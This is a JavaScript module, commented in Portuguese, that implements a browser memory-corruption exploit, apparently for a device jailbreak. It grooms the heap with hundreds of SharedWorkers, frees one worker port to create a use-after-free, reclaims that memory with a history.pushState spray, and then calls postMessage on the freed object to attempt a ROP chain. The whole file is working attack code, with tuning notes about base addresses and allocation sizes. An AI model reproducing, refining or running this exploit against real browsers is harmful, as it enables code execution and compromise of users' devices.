import { CONFIG } from './config.mjs';
import { log } from './utils.mjs';
import { build_history_payload } from './payloads.mjs';

var workers_stash = [];
var is_running = false;

export function init() {
    const btn = document.getElementById("btn_run");
    if(btn) btn.addEventListener("click", start_exploit);
    log("Módulo carregado. Pronto para History Spray.", "success");
}

async function start_exploit() {
    if (is_running) return;
    if (!window.SharedWorker) return log("ERRO: Navegador incompatível.", "fail");
    
    is_running = true;
    
    // Vamos testar os tamanhos configurados
    // Começando pelo 0xC0 que deu panic antes
    const size = CONFIG.SIZES_TO_TEST[1]; // 0xC0
    log(`>>> INICIANDO HISTORY SPRAY (Size: 0x${size.toString(16)}) <<<`, "warn");

    const payload = build_history_payload(size);

    // 1. Grooming (Base Sólida)
    log("Grooming (350)...");
    for(let i=0; i<350; i++) {
        try { workers_stash.push(new SharedWorker("data:text,1", "g"+i)); } catch(e){}
    }

    // 2. Trigger Loop (Indo até o limite do Crash)
    let p_count = 0;
    // Vamos até 405 para garantir que a memória fique crítica
    const limit = CONFIG.WORKER_LIMIT - 350; 

    const interval = setInterval(() => {
        // CHEGAMOS NO PONTO DE RUPTURA
        if (p_count >= limit) {
            clearInterval(interval);
            trigger_uaf(payload);
            return;
        }

        try {
            let w = new SharedWorker("data:text,1", "v_"+p_count);
            w.port.start();
            workers_stash.push(w);
            if(p_count % 5 == 0) log(`Pressão: ${351+p_count}`);
        } catch(e) {
            log("Erro alocação: " + e);
        }
        
        p_count++;
    }, 100); // Rápido para manter a pressão
}

function trigger_uaf(payload) {
    log("!!! DISPARANDO NO LIMITE !!!", "fail");
    
    // 1. Libera o último (A gota d'água)
    const victim = workers_stash.pop();
    victim.port.close();
    
    // 2. HISTORY SPRAY (Reclaim)
    // History API é muito rápida e aloca no General Heap
    log("Injetando History States...");
    
    // Criamos um estado "dummy" para empurrar a memória
    const stateObj = { data: payload }; 
    
    // Spray massivo e rápido
    for(let k=0; k<CONFIG.SPRAY_QUANTITY; k++) {
        history.pushState(stateObj, "");
    }

    // 3. TRIGGER DE EXECUÇÃO
    log("Tentando ativar ROP...");
    try {
        // Tenta forçar o uso do objeto corrompido
        victim.port.postMessage("PWN");
    } catch(e) {}

    log("Aguardando...");
    log("Se CONGELAR: SUCESSO.");
    log("Se PANIC: Ajustar Base ou Tamanho.");
}
